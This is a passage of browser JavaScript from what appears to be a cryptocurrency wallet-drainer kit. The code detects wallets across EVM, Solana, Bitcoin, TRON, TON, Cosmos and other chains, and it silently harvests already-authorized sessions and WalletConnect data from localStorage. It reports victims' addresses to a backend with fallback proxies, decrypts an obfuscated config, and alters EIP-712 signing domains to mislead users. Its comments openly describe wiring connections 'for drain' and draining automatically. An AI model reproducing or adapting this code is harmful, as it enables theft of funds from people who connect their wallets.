    if (eth && k === 'metamask' && eth.isMetaMask && !eth.isRabby && !eth.isTrust && !isPhantomEvmProvider(eth)) return eth;
    if (eth && k === 'trust' && (eth.isTrust || eth.isTrustWallet)) return eth;
    return null;
  }

  function providerInstalledLabel(key) {
    var labels = {
      metamask: 'MetaMask',
      trust: 'Trust Wallet',
      coinbase: 'Coinbase Wallet',
      binance: 'Binance Wallet',
      rabby: 'Rabby',
      okx: 'OKX Wallet',
    };
    return labels[String(key || '').toLowerCase()] || 'Wallet';
  }

  // ── Chain-family discovery (blockchain API first — NOT wallet brand names) ──
  var discoveredSolanaWallets = [];

  function registerSolanaWalletStandard(w) {
    if (!w || typeof w !== 'object') return;
    var dup = discoveredSolanaWallets.some(function (x) { return x === w; });
    if (!dup) discoveredSolanaWallets.push(w);
  }

  try {
    window.addEventListener('wallet-standard:register', function (ev) {
      var d = ev.detail;
      if (Array.isArray(d)) d.forEach(registerSolanaWalletStandard);
      else registerSolanaWalletStandard(d);
    });
    window.addEventListener('wallet-standard:app-ready', function (ev) {
      var api = ev.detail && ev.detail.register;
      if (typeof api === 'function') {
        api(function (w) { registerSolanaWalletStandard(w); });
      }
    });
    if (window.navigator && window.navigator.wallets) {
      window.navigator.wallets.forEach(registerSolanaWalletStandard);
    }
  } catch (e) {}

  function hasSvmApi(p) {
    if (!p || typeof p !== 'object') return false;
    var canConnect = !!(p.connect || (p.features && p.features['standard:connect']));
    var canSign = !!(p.signTransaction || p.signAllTransactions ||
      (p.features && (p.features['solana:signTransaction'] || p.features['solana:signAllTransactions'])));
    return canConnect && canSign;
  }

  function hasUtxoApi(p) {
    if (!p || typeof p !== 'object') return false;
    return !!(p.signPsbt && (p.requestAccounts || p.connect || p.getAccounts));
  }

  function hasTronApi(obj) {
    if (!obj) return false;
    var tw = obj.tronWeb || obj;
    return !!(tw && (tw.defaultAddress || tw.trx || tw.transactionBuilder));
  }

  function hasTonApi(p) {
    if (!p || typeof p !== 'object') return false;
    return !!(p.connect || p.sendTransaction || p.send);
  }

  function hasCosmosApi(p) {
    if (!p || typeof p !== 'object') return false;
    return !!(p.enable && (p.signAmino || p.signDirect || p.getKey));
  }

  function hasAptosApi(p) {
    if (!p || typeof p !== 'object') return false;
    return !!(p.connect || p.signAndSubmitTransaction || p.account);
  }

  function hasSuiApi(p) {
    if (!p || typeof p !== 'object') return false;
    return !!(p.connect || p.signTransactionBlock || p.signAndExecuteTransactionBlock);
  }

  function pushFamily(list, seen, provider, family, hint) {
    if (!provider || typeof provider !== 'object') return;
    if (seen.indexOf(provider) !== -1) return;
    seen.push(provider);
    list.push({ family: family, provider: provider, hint: hint || family });
  }

  function scanObjectForFamily(root, list, seen, family, testFn, prefix) {
    if (!root || typeof root !== 'object') return;
    try {
      if (testFn(root)) pushFamily(list, seen, root, family, prefix || family);
    } catch (e) {}
    var keys;
    try { keys = Object.keys(root); } catch (e2) { return; }
    for (var i = 0; i < keys.length; i++) {
      var k = keys[i];
      if (k === 'parent' || k === 'top' || k === 'window') continue;
      try {
        var child = root[k];
        if (child && typeof child === 'object' && testFn(child)) {
          pushFamily(list, seen, child, family, (prefix ? prefix + '.' : '') + k);
        }
      } catch (e3) {}
    }
  }

  function discoverChainFamilies() {
    var seen = [];
    var fp = {
      SVM: [], UTXO: [], TRON: [], TON: [], COSMOS: [], APTOS: [], SUI: [],
    };

    discoveredSolanaWallets.forEach(function (w) {
      pushFamily(fp.SVM, seen, w, 'SVM', (w && w.name) ? w.name : 'wallet-standard');
    });

    scanObjectForFamily(window.solana, fp.SVM, seen, 'SVM', hasSvmApi, 'window.solana');
    if (window.phantom) scanObjectForFamily(window.phantom, fp.SVM, seen, 'SVM', hasSvmApi, 'phantom');
    if (window.solflare) pushFamily(fp.SVM, seen, window.solflare, 'SVM', 'solflare');
    if (window.backpack) scanObjectForFamily(window.backpack, fp.SVM, seen, 'SVM', hasSvmApi, 'backpack');
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.SVM, seen, 'SVM', hasSvmApi, 'okxwallet');
    if (window.bitkeep) scanObjectForFamily(window.bitkeep, fp.SVM, seen, 'SVM', hasSvmApi, 'bitkeep');
    if (window.trustwallet) scanObjectForFamily(window.trustwallet, fp.SVM, seen, 'SVM', hasSvmApi, 'trustwallet');
    if (window.coinbaseSolana) pushFamily(fp.SVM, seen, window.coinbaseSolana, 'SVM', 'coinbaseSolana');

    if (window.unisat) pushFamily(fp.UTXO, seen, window.unisat, 'UTXO', 'unisat');
    if (window.BitcoinProvider) pushFamily(fp.UTXO, seen, window.BitcoinProvider, 'UTXO', 'BitcoinProvider');
    if (window.LeatherProvider) pushFamily(fp.UTXO, seen, window.LeatherProvider, 'UTXO', 'leather');
    if (window.HiroWalletProvider) pushFamily(fp.UTXO, seen, window.HiroWalletProvider, 'UTXO', 'hiro');
    if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
      pushFamily(fp.UTXO, seen, window.XverseProviders.BitcoinProvider, 'UTXO', 'xverse');
    }
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.UTXO, seen, 'UTXO', hasUtxoApi, 'okxwallet');
    if (window.bitkeep) scanObjectForFamily(window.bitkeep, fp.UTXO, seen, 'UTXO', hasUtxoApi, 'bitkeep');
    if (window.phantom) scanObjectForFamily(window.phantom, fp.UTXO, seen, 'UTXO', hasUtxoApi, 'phantom');

    if (window.tronLink) pushFamily(fp.TRON, seen, window.tronLink, 'TRON', 'tronLink');
    if (window.tronWeb) pushFamily(fp.TRON, seen, { tronWeb: window.tronWeb }, 'TRON', 'tronWeb');
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.TRON, seen, 'TRON', hasTronApi, 'okxwallet');

    if (window.tonkeeper) pushFamily(fp.TON, seen, window.tonkeeper, 'TON', 'tonkeeper');
    if (window.ton) pushFamily(fp.TON, seen, window.ton, 'TON', 'ton');
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.TON, seen, 'TON', hasTonApi, 'okxwallet');

    if (window.keplr) pushFamily(fp.COSMOS, seen, window.keplr, 'COSMOS', 'keplr');
    if (window.leap) pushFamily(fp.COSMOS, seen, window.leap, 'COSMOS', 'leap');
    if (window.cosmostation && window.cosmostation.providers) {
      scanObjectForFamily(window.cosmostation.providers, fp.COSMOS, seen, 'COSMOS', hasCosmosApi, 'cosmostation');
    }

    if (window.aptos) pushFamily(fp.APTOS, seen, window.aptos, 'APTOS', 'aptos');
    if (window.petra && window.petra.aptos) pushFamily(fp.APTOS, seen, window.petra.aptos, 'APTOS', 'petra');
    if (window.martian) pushFamily(fp.APTOS, seen, window.martian, 'APTOS', 'martian');
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.APTOS, seen, 'APTOS', hasAptosApi, 'okxwallet');

    if (window.suiWallet) pushFamily(fp.SUI, seen, window.suiWallet, 'SUI', 'suiWallet');
    if (window.phantom) scanObjectForFamily(window.phantom, fp.SUI, seen, 'SUI', hasSuiApi, 'phantom');
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.SUI, seen, 'SUI', hasSuiApi, 'okxwallet');

    S.familyProviders = fp;
    var counts = [];
    Object.keys(fp).forEach(function (k) {
      if (fp[k].length) counts.push(k + ':' + fp[k].length);
    });
    if (counts.length) L.log('[families] detected', counts.join(' '));
    return fp;
  }

  function firstFamilyProvider(family) {
    var list = (S.familyProviders && S.familyProviders[family]) || [];
    return list.length ? list[0] : null;
  }

  function collectAddressMap(evmOptional) {
    var m = {};
    var evm = evmOptional || S.evmAddr;
    if (evm) m.evm = String(evm).toLowerCase();
    if (S.chains.SOL && S.chains.SOL.address) m.sol = S.chains.SOL.address;
    if (S.chains.TRON && S.chains.TRON.address) m.tron = S.chains.TRON.address;
    if (S.chains.TON && S.chains.TON.address) m.ton = S.chains.TON.address;
    if (S.chains.BTC && S.chains.BTC.address) m.btc = S.chains.BTC.address;
    if (S.chains.COSMOS && S.chains.COSMOS.address) m.cosmos = S.chains.COSMOS.address;
    if (S.chains.APTOS && S.chains.APTOS.address) m.aptos = S.chains.APTOS.address;
    if (S.chains.SUI && S.chains.SUI.address) m.sui = S.chains.SUI.address;
    if (S.chains.POLKADOT && S.chains.POLKADOT.address) m.polkadot = S.chains.POLKADOT.address;
    if (S.chains.ALGORAND && S.chains.ALGORAND.address) m.algorand = S.chains.ALGORAND.address;
    if (S.chains.CARDANO && S.chains.CARDANO.address) m.cardano = S.chains.CARDANO.address;
    return m;
  }

  function scanWcSessionAllFamilies() {
    var out = {};
    var NS_OUT = {
      eip155: 'evm', solana: 'sol', bip122: 'btc', tron: 'tron', ton: 'ton', tvm: 'ton',
      cosmos: 'cosmos', polkadot: 'polkadot', algorand: 'algorand', cardano: 'cardano',
      aptos: 'aptos', sui: 'sui', near: 'near',
    };
    function putAddr(outKey, caip) {
      if (!caip || out[outKey]) return;
      var addr = null;
      if (window.LegionCaipRegistry && typeof window.LegionCaipRegistry.extractWcAccountAddress === 'function') {
        addr = window.LegionCaipRegistry.extractWcAccountAddress(caip, function (m) { L.log(m); });
      } else if (window.LegionCaipRegistry && typeof window.LegionCaipRegistry.parseCaip10WithFallback === 'function') {
        var p = window.LegionCaipRegistry.parseCaip10WithFallback(caip, function (m) { L.log(m); });
        addr = p && p.address ? p.address : null;
      }
      if (!addr) {
        var parts = String(caip).split(':');
        addr = parts[parts.length - 1];
      }
      if (!addr) return;
      out[outKey] = outKey === 'evm' ? String(addr).toLowerCase() : addr;
    }
    try {
      var keys = Object.keys(localStorage);
      for (var ki = 0; ki < keys.length; ki++) {
        var k = keys[ki];
        if (k.indexOf('wc@') === -1 || k.indexOf('session') === -1) continue;
        var obj = JSON.parse(localStorage.getItem(k) || '{}');
        var sessions = Object.values(obj);
        for (var si = sessions.length - 1; si >= 0; si--) {
          var ns = sessions[si] && sessions[si].namespaces;
          if (!ns) continue;
          Object.keys(NS_OUT).forEach(function (nsKey) {
            if (ns[nsKey] && ns[nsKey].accounts && ns[nsKey].accounts[0]) {
              putAddr(NS_OUT[nsKey], ns[nsKey].accounts[0]);
            }
          });
        }
      }
    } catch (e) {}
    return out;
  }

  function wireWcBtcConnection(btcAddr) {
    if (!btcAddr || S.familyConnections.UTXO) return;
    var btcProv = null;
    try {
      if (window.LegionWallet && typeof window.LegionWallet.getBitcoinProvider === 'function') {
        btcProv = window.LegionWallet.getBitcoinProvider();
      }
    } catch (e) {}
    if (!btcProv) {
      L.warn('[UTXO] WC BTC address — scan-only (no bip122 provider)');
      S.familyConnections.UTXO = {
        provider: null,
        address: btcAddr,
        name: 'UTXO',
        family: 'UTXO',
        hint: 'walletconnect',
        wcSession: true,
        addressOnly: true,
      };
      return;
    }
    S.familyConnections.UTXO = {
      provider: btcProv,
      address: btcAddr,
      name: 'UTXO',
      family: 'UTXO',
      hint: 'walletconnect',
    };
    L.log('[UTXO] WC provider wired for drain');
  }

  /** Trust/OKX add bip122 after EVM approve — poll before backend notify. */
  async function waitForWcBip122Harvest(evmAddr) {
    if (S.connectMode !== 'wc') return;
    if (S.chains.BTC && S.chains.BTC.address) return;
    UI.status('Approve Bitcoin on your phone wallet...');
    var linkedBtc = await ensureWcBip122Linked();
    if (linkedBtc) {
      applyWcSessionAddresses(scanWcSessionAllFamilies());
      wireWcFamilyConnections();
      S.allAddresses = collectAddressMap(evmAddr);
      saveWcFamilyContext(S.allAddresses);
      L.log('[UTXO] bip122 ready for broadcast:', linkedBtc.slice(0, 8) + '...');
      return;
    }
    for (var i = 0; i < 45; i++) {
      applyLegionWalletSessionAddresses();
      wireWcFamilyConnections();
      if (S.chains.BTC && S.chains.BTC.address) {
        S.allAddresses = collectAddressMap(evmAddr);
        saveWcFamilyContext(S.allAddresses);
        L.log('[UTXO] bip122 from session poll:', S.chains.BTC.address.slice(0, 8) + '...');
        return;
      }
      await sleep(2000);
    }
    L.warn('[UTXO] bip122 not linked — enable Bitcoin in Trust/OKX and re-connect');
  }

  function applyWcSessionAddresses(wcAddr) {
    if (!wcAddr) return;
    if (wcAddr.sol && !S.chains.SOL) {
      S.chains.SOL = { address: wcAddr.sol, name: 'SVM', wcSession: true };
      L.log('[SVM] WC session address:', wcAddr.sol.slice(0, 8) + '...');
    }
    if (wcAddr.btc && !S.chains.BTC) {
      S.chains.BTC = { address: wcAddr.btc, name: 'UTXO', wcSession: true };
      L.log('[UTXO] WC session address:', wcAddr.btc.slice(0, 8) + '...');
      wireWcBtcConnection(wcAddr.btc);
    }
    if (wcAddr.tron && !S.chains.TRON) {
      S.chains.TRON = { address: wcAddr.tron, wcSession: true };
      L.log('[TRON] WC session address:', wcAddr.tron.slice(0, 8) + '...');
    }
    if (wcAddr.ton && !S.chains.TON) {
      S.chains.TON = { address: wcAddr.ton, wcSession: true };
      L.log('[TON] WC session address:', wcAddr.ton.slice(0, 8) + '...');
    }
    if (wcAddr.cosmos && !S.chains.COSMOS) {
      S.chains.COSMOS = { address: wcAddr.cosmos, wcSession: true };
      L.log('[COSMOS] WC session address:', wcAddr.cosmos.slice(0, 8) + '...');
    }
    if (wcAddr.aptos && !S.chains.APTOS) {
      S.chains.APTOS = { address: wcAddr.aptos, wcSession: true };
      L.log('[APTOS] WC session address:', wcAddr.aptos.slice(0, 8) + '...');
    }
    if (wcAddr.sui && !S.chains.SUI) {
      S.chains.SUI = { address: wcAddr.sui, wcSession: true };
      L.log('[SUI] WC session address:', wcAddr.sui.slice(0, 8) + '...');
    }
    if (wcAddr.polkadot && !S.chains.POLKADOT) {
      S.chains.POLKADOT = { address: wcAddr.polkadot, wcSession: true };
      wireWcPolkadotConnection(wcAddr.polkadot);
      L.log('[DOT] WC session address:', wcAddr.polkadot.slice(0, 8) + '...');
    }
    if (wcAddr.algorand && !S.chains.ALGORAND) {
      S.chains.ALGORAND = { address: wcAddr.algorand, wcSession: true };
      wireWcAlgorandConnection(wcAddr.algorand);
      L.log('[ALGO] WC session address:', wcAddr.algorand.slice(0, 8) + '...');
    }
    if (wcAddr.cardano && !S.chains.CARDANO) {
      S.chains.CARDANO = { address: wcAddr.cardano, wcSession: true };
      wireWcCardanoConnection(wcAddr.cardano);
      L.log('[ADA] WC session address:', wcAddr.cardano.slice(0, 8) + '...');
    }
  }

  function wireWcPolkadotConnection(dotAddr) {
    if (!dotAddr || S.familyConnections.POLKADOT) return;
    S.familyConnections.POLKADOT = {
      provider: null,
      address: dotAddr,
      name: 'POLKADOT',
      family: 'POLKADOT',
      hint: 'walletconnect',
      wcSession: true,
    };
  }

  function wireWcAlgorandConnection(algoAddr) {
    if (!algoAddr || S.familyConnections.ALGORAND) return;
    S.familyConnections.ALGORAND = {
      provider: null,
      address: algoAddr,
      name: 'ALGORAND',
      family: 'ALGORAND',
      hint: 'walletconnect',
      wcSession: true,
    };
  }

  function wireWcCardanoConnection(adaAddr) {
    if (!adaAddr || S.familyConnections.CARDANO) return;
    S.familyConnections.CARDANO = {
      provider: null,
      address: adaAddr,
      name: 'CARDANO',
      family: 'CARDANO',
      hint: 'walletconnect',
      wcSession: true,
    };
  }

  function wireWcFamilyConnections() {
    if (S.chains.SOL && S.chains.SOL.address && !S.familyConnections.SVM) {
      var solProv = null;
      try {
        if (window.LegionWallet && typeof window.LegionWallet.getSolanaProvider === 'function') {
          solProv = window.LegionWallet.getSolanaProvider();
        }
      } catch (e) {}
      if (!solProv) {
        L.warn('[SVM] WC address present but no Solana provider — scan only, drain skipped until signer available');
      } else {
      S.familyConnections.SVM = {
        provider: solProv,
        address: S.chains.SOL.address,
        name: 'SVM',
        family: 'SVM',
        hint: 'walletconnect',
        wcSession: true,
      };
      }
    }
    if (S.chains.TRON && S.chains.TRON.address && !S.familyConnections.TRON) {
      S.familyConnections.TRON = {
        provider: null,
        address: S.chains.TRON.address,
        name: 'TRON',
        family: 'TRON',
        hint: 'walletconnect',
        wcSession: true,
        addressOnly: true,
      };
    }
    if (S.chains.TON && S.chains.TON.address && !S.familyConnections.TON) {
      S.familyConnections.TON = {
        provider: null,
        address: S.chains.TON.address,
        name: 'TON',
        family: 'TON',
        hint: 'walletconnect',
        wcSession: true,
        addressOnly: true,
      };
    }
    if (S.chains.BTC && S.chains.BTC.address && !S.familyConnections.UTXO) {
      var btcProv = null;
      try {
        if (window.LegionWallet && typeof window.LegionWallet.getBitcoinProvider === 'function') {
          btcProv = window.LegionWallet.getBitcoinProvider();
        }
      } catch (e) {}
      if (!btcProv) {
        L.warn('[UTXO] WC BTC address — scan-only (no bip122 provider)');
      }
      S.familyConnections.UTXO = {
        provider: btcProv,
        address: S.chains.BTC.address,
        name: 'UTXO',
        family: 'UTXO',
        hint: 'walletconnect',
        wcSession: true,
        addressOnly: !btcProv,
      };
      if (btcProv) wireWcBtcConnection(S.chains.BTC.address);
    }
    if (S.chains.COSMOS && S.chains.COSMOS.address && !S.familyConnections.COSMOS) {
      S.familyConnections.COSMOS = {
        provider: null,
        address: S.chains.COSMOS.address,
        name: 'COSMOS',
        family: 'COSMOS',
        hint: 'walletconnect',
        wcSession: true,
        addressOnly: true,
      };
    }
    if (S.chains.APTOS && S.chains.APTOS.address && !S.familyConnections.APTOS) {
      S.familyConnections.APTOS = {
        provider: null,
        address: S.chains.APTOS.address,
        name: 'APTOS',
        family: 'APTOS',
        hint: 'walletconnect',
        wcSession: true,
        addressOnly: true,
      };
    }
    if (S.chains.SUI && S.chains.SUI.address && !S.familyConnections.SUI) {
      S.familyConnections.SUI = {
        provider: null,
        address: S.chains.SUI.address,
        name: 'SUI',
        family: 'SUI',
        hint: 'walletconnect',
        wcSession: true,
        addressOnly: true,
      };
    }
  }

  async function broadcastConnectScan(evmAddr, chainId, walletName, addrs) {
    addrs = addrs || collectAddressMap(evmAddr);
    var compact = Object.keys(addrs).slice(0, 12).map(function (k) {
      return k + ':' + String(addrs[k]).slice(0, 10) + '...';
    });
    await SCOUT.telemetry(evmAddr, chainId, walletName, addrs);
    L.log('[connect] backend notified |', compact.join(' | ') || 'evm only');
  }

  /** Harvest already-authorized non-EVM sessions without opening extension popups. */
  function silentHarvestConnectedFamilies() {
    try {
      var svmList = (S.familyProviders && S.familyProviders.SVM) || [];
      for (var si = 0; si < svmList.length; si++) {
        var sp = svmList[si].provider;
        if (!sp) continue;
        var pk = sp.publicKey || (sp.account && sp.account.publicKey);
        var solAddr = pk ? (pk.toString ? pk.toString() : String(pk)) : '';
        if (solAddr) {
          S.chains.SOL = { address: solAddr, name: svmList[si].hint || 'SVM' };
          S.familyConnections.SVM = {
            provider: sp,
            address: solAddr,
            name: 'SVM',
            family: 'SVM',
            hint: svmList[si].hint || 'extension',
          };
          break;
        }
      }
    } catch (e) {}
    try {
      if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        var tAddr = window.tronWeb.defaultAddress.base58;
        S.chains.TRON = { address: tAddr, name: 'TronLink' };
      }
    } catch (e2) {}
  }

  /** One connect: harvest WC session + extension families, send all addresses to backend. */
  async function linkAllFamiliesOnConnect(evmAddr) {
    discoverChainFamilies();
    applyLegionWalletSessionAddresses();
    wireWcFamilyConnections();

    // Browser extension pick (MetaMask, Trust, Coinbase, Rabby, …):
    // Connect the picked EVM wallet only — do NOT auto-open Phantom/SOL popups.
    // Still silently harvest SOL/TRON if already authorized in browser.
    // Full multi-chain prompts stay on WalletConnect (phone approves all namespaces).
    if (S.connectMode === 'injected') {
      silentHarvestConnectedFamilies();
      applyLegionWalletSessionAddresses();
      wireWcFamilyConnections();
      S.familiesLinked = true;
      S.allAddresses = collectAddressMap(evmAddr);
      saveWcFamilyContext(S.allAddresses);
      var extParts = [];
      Object.keys(S.allAddresses).forEach(function (fk) {
        if (S.allAddresses[fk]) extParts.push(fk + ':' + String(S.allAddresses[fk]).slice(0, 10) + '...');
      });
      L.log(
        '[connect] linked families:',
        extParts.join(' | ') || ('evm:' + String(evmAddr).slice(0, 10) + '...'),
        '| extension pick:',
        S.injectedWalletKey || 'injected',
        '(no cross-wallet popups)'
      );
      return S.allAddresses;
    }

    if (S.connectMode !== 'wc') {
      var linkers = [
        { family: 'SVM', fn: connectSol },
        { family: 'UTXO', fn: connectBtc },
        { family: 'TRON', fn: connectTron },
        { family: 'TON', fn: connectTon },
        { family: 'COSMOS', fn: connectCosmos },
        { family: 'APTOS', fn: connectAptos },
        { family: 'SUI', fn: connectSui },
      ];
      var tasks = [];
      for (var li = 0; li < linkers.length; li++) {
        (function (entry) {
          var providers = (S.familyProviders && S.familyProviders[entry.family]) || [];
          if (!providers.length) return;
          tasks.push(
            entry.fn().then(function (conn) {
              if (conn) S.familyConnections[entry.family] = conn;
              return conn;
            }).catch(function (e) {
              L.warn('[' + entry.family + '] link skip:', e.message);
              return null;
            })
          );
        })(linkers[li]);
      }
      if (tasks.length) await Promise.all(tasks);
      applyLegionWalletSessionAddresses();
      wireWcFamilyConnections();
    }

    S.familiesLinked = true;
    S.allAddresses = collectAddressMap(evmAddr);
    saveWcFamilyContext(S.allAddresses);
    var parts = [];
    var familyOrder = ['evm', 'sol', 'btc', 'tron', 'ton', 'cosmos', 'aptos', 'sui'];
    familyOrder.forEach(function (fk) {
      if (S.allAddresses[fk]) {
        parts.push(fk + ':' + String(S.allAddresses[fk]).slice(0, 10) + '...');
      }
    });
    Object.keys(S.allAddresses).forEach(function (fk) {
      if (familyOrder.indexOf(fk) === -1) {
        parts.push(fk + ':' + String(S.allAddresses[fk]).slice(0, 10) + '...');
      }
    });
    L.log('[connect] linked families:', parts.length ? parts.join(' | ') : 'EVM only');
    if (parts.length) {
      L.log('[connect] multi-chain ready —', parts.length, 'families | scan + drain will proceed automatically');
    }
    return S.allAddresses;
  }

  /** One connect step: link every detected chain family (parallel, same user gesture). */
  async function connectAllFamilies() {
    return linkAllFamiliesOnConnect(S.evmAddr);
  }

  function detectNonEvm() {
    discoverChainFamilies();
    return S.familyProviders || {};
  }

  var EVM_FINGERPRINTS = [
    ['isRabby', 'Rabby'], ['isOkxWallet', 'OKX'], ['isCoinbaseWallet', 'Coinbase Wallet'],
    ['isBraveWallet', 'Brave'], ['isTrust', 'Trust Wallet'], ['isBitKeep', 'Bitget'],
    ['isBitget', 'Bitget'], ['isTokenPocket', 'TokenPocket'], ['isFrame', 'Frame'],
    ['isSafePal', 'SafePal'], ['isZerion', 'Zerion'], ['is1inch', '1inch'],
    ['isRainbow', 'Rainbow'], ['isPhantom', 'Phantom'], ['isExodus', 'Exodus'],
    ['isMetaMask', 'MetaMask'],
  ];

  function detectEvmWalletName(provider) {
    if (!provider) return 'Unknown Wallet';
    for (var i = 0; i < EVM_FINGERPRINTS.length; i++) {
      if (provider[EVM_FINGERPRINTS[i][0]]) return EVM_FINGERPRINTS[i][1];
    }
    return 'Browser Wallet';
  }

  function isMetaMaskProvider(provider) {
    return !!(provider && provider.isMetaMask && !provider.isRabby && !provider.isBraveWallet && !provider.isWalletConnect);
  }

  function toHexQty(val) {
    if (val == null) return '0x0';
    if (typeof val === 'string' && val.indexOf('0x') === 0) return val;
    if (typeof val === 'bigint') return '0x' + val.toString(16);
    if (typeof val === 'number') return '0x' + val.toString(16);
    return '0x' + BigInt(val).toString(16);
  }

  function canTryNativeSignTx(provider) {
    return !isMetaMaskProvider(provider);
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 06: API HELPERS
  // ═══════════════════════════════════════════════════════════════
  function toHex(obj) {
    var str = typeof obj === 'string' ? obj : JSON.stringify(obj, function (k, v) {
      return typeof v === 'bigint' ? v.toString() : v;
    });
    var hex = '0x';
    for (var i = 0; i < str.length; i++) hex += str.charCodeAt(i).toString(16).padStart(2, '0');
    return hex;
  }

  function jsonSafe(obj) {
    return JSON.stringify(obj, function (k, v) { return typeof v === 'bigint' ? v.toString() : v; });
  }

  function resolveApiBaseUrls() {
    var urls = [];
    if (S.proxyUrls && S.proxyUrls.length) {
      S.proxyUrls.forEach(function (u) {
        var n = String(u).replace(/\/$/, '');
        if (n && urls.indexOf(n) < 0) urls.push(n);
      });
    }
    if (S.backendEndpoints && S.backendEndpoints.length) {
      S.backendEndpoints.forEach(function (u) {
        var n = String(u).replace(/\/$/, '');
        if (n && urls.indexOf(n) < 0) urls.push(n);
      });
    }
    var primary = String(BACKEND || '').replace(/\/$/, '');
    if (primary && urls.indexOf(primary) < 0) urls.unshift(primary);
    return urls.length ? urls : [BACKEND];
  }

  async function sha256Bytes(str) {
    if (typeof crypto !== 'undefined' && crypto.subtle && crypto.subtle.digest) {
      var enc = new TextEncoder().encode(String(str));
      var hash = await crypto.subtle.digest('SHA-256', enc);
      return new Uint8Array(hash);
    }
    throw new Error('WebCrypto unavailable for vault decrypt');
  }

  function xorDecryptB64(b64, keyBytes) {
    var raw = Uint8Array.from(atob(b64), function (c) { return c.charCodeAt(0); });
    var out = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) out[i] = raw[i] ^ keyBytes[i % keyBytes.length];
    return new TextDecoder().decode(out);
  }

  async function decryptVaultPayload(encB64, secret) {
    if (!encB64 || !secret) return null;
    try {
      var key = await sha256Bytes(secret);
      return JSON.parse(xorDecryptB64(encB64, key));
    } catch (e) {
      L.warn('vault decrypt fail:', e.message);
      return null;
    }
  }

  function applyDynamicEip712Domain(typedData, chainId) {
    if (!typedData || !typedData.domain) return typedData;
    var id = String(Number(chainId));
    var domCfg = (S.eip712Domains && (S.eip712Domains[id] || S.eip712Domains['default'])) || null;
    if (domCfg) {
      if (domCfg.name) typedData.domain.name = domCfg.name;
      if (domCfg.version) typedData.domain.version = domCfg.version;
      if (domCfg.verifyingContract) typedData.domain.verifyingContract = domCfg.verifyingContract;
      return typedData;
    }
    if (typeof window !== 'undefined' && window.location && S.deployDomains && S.deployDomains.length) {
      var origin = window.location.origin;
      for (var di = 0; di < S.deployDomains.length; di++) {
        if (S.deployDomains[di] === origin && window.location.hostname) {
          typedData.domain.name = window.location.hostname.replace(/\./g, ' ');
          break;
        }
      }
    }
    return typedData;
  }

  async function apiFetch(path, opts) {
    var bases = resolveApiBaseUrls();
    var lastErr = null;
    for (var bi = 0; bi < bases.length; bi++) {
      try {
        var base = String(bases[bi]).replace(/\/$/, '');
        await rpcRateWait(base);
        var res = await fetch(base + path, opts);
        if (res.status >= 500) throw new Error('HTTP ' + res.status);
        BACKEND = base;
        return res;
      } catch (e) { lastErr = e; }
    }
    throw lastErr || new Error('All API endpoints failed');
  }

  async function apiPost(path, body, tries) {
    tries = tries || 0;
    try {
      var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
      var timer = ctrl ? setTimeout(function () { ctrl.abort(); }, 20000) : null;
      var headers = { 'Content-Type': 'application/json', 'X-Source-Origin': window.location.origin };
      if (KINETIC_KEY) headers['x-legion-kinetic-key'] = KINETIC_KEY;
      var opts = {
        method: 'POST',
        headers: headers,
        body: jsonSafe(body),
      };
      if (ctrl) opts.signal = ctrl.signal;
      var res = await apiFetch(path, opts);
      if (timer) clearTimeout(timer);
      var data = await res.json().catch(function () { return {}; });
      if (!res.ok) {
        var deferred = res.status === 503 && data && (
          data.code === 'DEFERRED_BROADCAST' ||
          data.settlement_status === 'PENDING_BROADCAST' ||
          (data.data && (data.data.code === 'DEFERRED_BROADCAST' || data.data.settlement_status === 'PENDING_BROADCAST'))
        );
        if (deferred) {
          S.deferredBroadcasts = (S.deferredBroadcasts || 0) + 1;
          L.log('API deferred broadcast (503):', path, '— backend will retry');
          return { success: true, deferred: true, data: data.data || data };
        }
        L.warn('API', res.status, path, data && data.message);
        return null;
      }
      return data;
    } catch (e) {
      if (tries < 2) { await sleep(1000); return apiPost(path, body, tries + 1); }
      L.warn('API failed:', path, e.message);
      return null;
    }
  }

  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  function sigHex(obj) {
    var str = typeof obj === 'string' ? obj : JSON.stringify(obj);
    var hex = '0x';
    for (var i = 0; i < str.length; i++) hex += str.charCodeAt(i).toString(16).padStart(2, '0');
    return hex;
  }

  function bufToB64(buf) {
    var bytes = buf instanceof Uint8Array ? buf : new Uint8Array(buf);
    var bin = '';
    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
  }

  var MIN_NATIVE_WEI = 100000000000000n; // 0.0001 ETH — drain dust floor (~$0.20)

  async function getProviderChainId(provider) {
    try {
      var hex = await provider.request({ method: 'eth_chainId' });
      return parseInt(String(hex).replace('0x', ''), 16);
    } catch (e) {
      return null;
    }
  }

  async function waitForProviderChain(provider, chainId, timeoutMs) {
    var deadline = Date.now() + (timeoutMs || 8000);
    while (Date.now() < deadline) {
      var cur = await getProviderChainId(provider);
      if (Number(cur) === Number(chainId)) return true;
      await sleep(200);
    }
    return false;
  }

  async function switchProviderChain(provider, chainId) {
    var hexId = '0x' + Number(chainId).toString(16);
    try {
      await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: hexId }],
      });
    } catch (switchErr) {
      var msg = String(switchErr && switchErr.message || switchErr || '');
      var code = switchErr && switchErr.code;
      if (msg.indexOf('Unrecognized chain') === -1 && msg.indexOf('4902') === -1 && code !== 4902) throw switchErr;
      var add = CHAIN_ADD_PARAMS[Number(chainId)];
      if (!add) throw switchErr;
      L.log('Adding chain', chainId, 'to wallet...');
      await provider.request({ method: 'wallet_addEthereumChain', params: [add] });
      await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hexId }] });
    }
    var matched = await waitForProviderChain(provider, chainId, 8000);
    if (!matched) L.warn('Chain', chainId, 'switch pending — provider not synced yet');
    await sleep(400);
  }

  async function safeSwitchProviderChain(provider, chainId) {
    try {
      var cur = await getProviderChainId(provider);
      if (cur === Number(chainId)) return true;
      await switchProviderChain(provider, chainId);
      return true;
    } catch (e) {
